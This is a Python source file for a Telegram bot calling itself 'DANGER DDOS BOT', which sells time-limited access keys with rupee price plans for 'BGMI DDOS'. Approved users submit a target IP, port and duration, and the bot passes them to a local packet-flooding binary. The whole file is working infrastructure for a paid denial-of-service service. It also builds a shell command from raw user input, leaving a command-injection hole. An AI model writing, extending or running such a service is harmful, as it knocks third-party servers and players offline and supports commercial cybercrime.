import time
import requests
import logging
from threading import Thread
import json
import os
import telebot
import asyncio
from datetime import datetime, timedelta
import uuid

# Load configuration
with open('config.json') as config_file:
    config = json.load(config_file)

BOT_TOKEN = config['bot_token']
ADMIN_IDS = config['admin_ids']

bot = telebot.TeleBot(BOT_TOKEN)

# File paths
USERS_FILE = 'users.txt'

def load_users():
    if not os.path.exists(USERS_FILE):
        return []
    users = []
    with open(USERS_FILE, 'r') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                user_data = json.loads(line)
                users.append(user_data)
            except json.JSONDecodeError:
                logging.error(f"Invalid JSON format in line: {line}")
    return users

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        for user in users:
            f.write(f"{json.dumps(user)}\n")

# Initialize users
users = load_users()

generated_keys = {}

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Async function to run attack command
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    command = f"./packet_sender {target_ip} {target_port} {duration}"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

        bot.send_message(chat_id, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀")
    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")

# Function to check if a user is an admin
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

# Function to check if a user is approved
def check_user_approval(user_id):
    for user in users:
        if user.get('user_id') == user_id and user.get('plan', 0) > 0:
            return True
    return False

# Send a not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*You Are Not Authorized ⚠*", parse_mode='Markdown')

# Helper: generate key (used by /genkey and admin redeem button flow)
def generate_unique_key_for_user(target_user_id, days):
    unique_key = str(uuid.uuid4())
    valid_until = (datetime.now() + timedelta(days=days)).date().isoformat()
    generated_keys[unique_key] = {"user_id": target_user_id, "valid_until": valid_until}
    return unique_key, valid_until

# Redeem helper logic (used by /redeem command and redeem button flow)
def redeem_key_logic(chat_id, user_id, key_to_redeem):
    if key_to_redeem not in generated_keys:
        bot.send_message(chat_id, "*Invalid or expired key.*", parse_mode='Markdown')
        return False

    key_info = generated_keys[key_to_redeem]

    if key_info['user_id'] != user_id:
        bot.send_message(chat_id, "*This key is not assigned to you.*", parse_mode='Markdown')
        return False

    # Add the user to the approved list (replace existing entry)
    valid_until = key_info['valid_until']
    user_info = {"user_id": user_id, "plan": 1, "valid_until": valid_until, "access_count": 0}

    global users
    users = [u for u in users if u.get('user_id') != user_id]
    users.append(user_info)
    save_users(users)

    # Remove the key after redemption
    del generated_keys[key_to_redeem]

    bot.send_message(chat_id, f"*Key redeemed successfully!*\n\nYour plan is now active until {valid_until}.", parse_mode='Markdown')
    return True

# /genkey command (admin)
@bot.message_handler(commands=['genkey'])
def generate_key_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "🔐You Are Not Authorized🔐", parse_mode='Markdown')
        return

    if len(cmd_parts) < 3:
        bot.send_message(chat_id, "*Invalid command format. Use /genkey <user_id> <days>*", parse_mode='Markdown')
        return

    try:
        target_user_id = int(cmd_parts[1])
        days = int(cmd_parts[2])
    except ValueError:
        bot.send_message(chat_id, "*Invalid arguments. user_id and days must be integers.*", parse_mode='Markdown')
        return

    unique_key, valid_until = generate_unique_key_for_user(target_user_id, days)
    bot.send_message(chat_id, f"*Key generated successfully!*\n\n🔑 Key: {unique_key}\nValid Until: {valid_until}", parse_mode='Markdown')

# /redeem command (user)
@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /redeem <key>*", parse_mode='Markdown')
        return

    key_to_redeem = cmd_parts[1]
    redeem_key_logic(chat_id, user_id, key_to_redeem)

# Attack command
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message, chat_id):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(chat_id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(target_ip, target_port, duration, chat_id), loop)
        bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}\nPort:{target_port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} seconds")
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

# /owner command handler
@bot.message_handler(commands=['owner'])
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @s1danger"
    bot.send_message(message.chat.id, owner_message)

# Status command
@bot.message_handler(commands=['status'])
def status_command(message):
    try:
        response = "*System status information*"
        bot.send_message(message.chat.id, response, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in status command: {e}")

# Approve list command
@bot.message_handler(commands=['approve_list'])
def approve_list_command(message):
    try:
        if not is_user_admin(message.from_user.id):
            send_not_approved_message(message.chat.id)
            return

        approved_users = [user for user in users if user.get('plan', 0) > 0]

        if not approved_users:
            bot.send_message(message.chat.id, "No approved users found.")
        else:
            response = "\n".join([f"User ID: {user['user_id']}, Valid Until: {user.get('valid_until', 'N/A')}" for user in approved_users])
            bot.send_message(message.chat.id, response, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in approve_list command: {e}")

# Start asyncio thread
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Button labels
BTN_ATTACK = "Attack🚀"
BTN_ACCOUNT = "My Plan🏦"
BTN_REDEEM = "🔑Redeem🔑"
BTN_REMOVE_USER = "Remove User❌"
BTN_HELP = "♻️Get Access♻️"

# Welcome message and buttons when the user sends /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or ""

    # Create the markup and buttons based on role
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    btn_attack = KeyboardButton(BTN_ATTACK)
    btn_account = KeyboardButton(BTN_ACCOUNT)
    btn_help = KeyboardButton(BTN_HELP)

    # Always include main user buttons
    markup.add(btn_attack, btn_account)

    # If admin, show admin buttons (Generate/Redeem for admin & Remove User)
    if is_user_admin(user_id):
        # admin gets the admin redeem (generate) and remove options
        btn_redeem_admin = KeyboardButton(BTN_REDEEM)  # admin flow label reused
        btn_remove = KeyboardButton(BTN_REMOVE_USER)
        markup.add(btn_redeem_admin, btn_remove)
    else:
        # Non-admin users should see Redeem 🔑 button
        btn_redeem_user = KeyboardButton(BTN_REDEEM)
        markup.add(btn_redeem_user)

    # Add help button for all users
    markup.add(btn_help)

    welcome_message = (
        f"🔆WELCOME TO DANGER DDOS BOT🔆@{username}\n\n"
        f"Join Group:- t.me/+rxtlPZ10biFhODM1"
        f"Please choose an option below to continue."
    )

    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)


# Normalize incoming text for safe comparisons
def normalize_text(txt):
    if not isinstance(txt, str):
        return ""
    return txt.strip().lower()

# Handle the flows triggered by keyboard buttons
@bot.message_handler(func=lambda message: True)
def echo_message(message):
    try:
        text_norm = normalize_text(message.text)
        user_id = message.from_user.id
        chat_id = message.chat.id

        if text_norm == normalize_text(BTN_ATTACK):
            attack_command(message)
            return

        if text_norm == normalize_text(BTN_ACCOUNT):
            found = False
            for user_data in load_users():
                if user_data.get('user_id') == user_id:
                    username = message.from_user.username or ""
                    plan = user_data.get('plan', 'N/A')
                    valid_until = user_data.get('valid_until', 'N/A')
                    response = (f"*USERNAME: @{username}\n"
                                f"Valid Until: {valid_until}\n"
                                f"Credit: @s1danger*")
                    bot.reply_to(message, response, parse_mode='Markdown')
                    found = True
                    break
            if not found:
                bot.reply_to(message, "*You are not an approved user.*", parse_mode='Markdown')
            return

                # Handle Redeem button press (works for both admin and normal users)
        if text_norm == normalize_text(BTN_REDEEM):
            # If admin pressed Redeem -> treat as admin "generate key" flow
            if is_user_admin(user_id):
                bot.send_message(chat_id, "*Enter target_user_id and days separated by a space (e.g. 12345678 30) to generate a redeem key for that user.*", parse_mode='Markdown')
                bot.register_next_step_handler(message, handle_admin_generate_key)
                return
            else:
                # Normal user pressed Redeem -> prompt for their redeem key
                bot.send_message(chat_id, "Please Enter Your Redeem Key", parse_mode='Markdown')
                bot.register_next_step_handler(message, handle_user_redeem_input)
                return


        if text_norm == normalize_text(BTN_REMOVE_USER):
            if not is_user_admin(user_id):
                bot.send_message(chat_id, "🔐You Are Not Authorized🔐", parse_mode='Markdown')
                return
            bot.send_message(chat_id, "*Enter user_id*", parse_mode='Markdown')
            bot.register_next_step_handler(message, handle_admin_remove_user)
            return

        if text_norm == normalize_text(BTN_HELP):
            bot.send_message(
        chat_id,
        "💎 BGMI DDOS PRICE PLANS 💎\n\n"
        "🥉 Basic Plan - 7 Days = ₹200\n"
        "🥈 Pro Plan - 30 Days = ₹500\n"
        "🥇 Pro Plan - 60 Days = 950\n"
        "🥇 Ultimate Plan - 365 Days = 2000\n\n"
        "💬 Contact Owner: @S1DANGER",
        parse_mode='Markdown'
    )
    
            
            
           

        # default fallback
        bot.send_message(message.chat.id, "💬Get Access Direct Owner: @S1DANGER💬")
    except Exception as e:
        logging.error(f"Error in echo_message: {e}")

# --- Handlers for next-step flows triggered by buttons ---

def handle_admin_generate_key(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    # double-check admin
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*⚠You Are Not Authorized⚠*", parse_mode='Markdown')
        return

    text = message.text.strip()
    parts = text.split()
    if len(parts) != 2:
        bot.send_message(chat_id, "*Invalid format. Use: <user_id> <days>*", parse_mode='Markdown')
        return
    try:
        target_user_id = int(parts[0])
        days = int(parts[1])
    except ValueError:
        bot.send_message(chat_id, "*Invalid. user_id and days must be integers.*", parse_mode='Markdown')
        return

    unique_key, valid_until = generate_unique_key_for_user(target_user_id, days)
    bot.send_message(chat_id, f"*Key generated successfully!*\n\n🔑 Key: {unique_key}\nValid Until: {valid_until}", parse_mode='Markdown')

def handle_user_redeem_input(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    key_to_redeem = message.text.strip()
    redeem_key_logic(chat_id, user_id, key_to_redeem)

def handle_admin_remove_user(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    # double-check admin
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*⚠You Are Not Authorized ⚠*", parse_mode='Markdown')
        return

    text = message.text.strip()
    try:
        remove_id = int(text)
    except ValueError:
        bot.send_message(chat_id, "*Invalid user_id. It must be an integer.*", parse_mode='Markdown')
        return

    global users
    original_len = len(users)
    users = [u for u in users if u.get('user_id') != remove_id]
    if len(users) < original_len:
        save_users(users)
        bot.send_message(chat_id, f"*User {remove_id} removed successfully.*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, f"*User {remove_id} not found in approved users.*", parse_mode='Markdown')

# Start the bot
if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    loop = asyncio.new_event_loop()
    thread = Thread(target=start_asyncio_thread)
    thread.start()
    bot.polling()
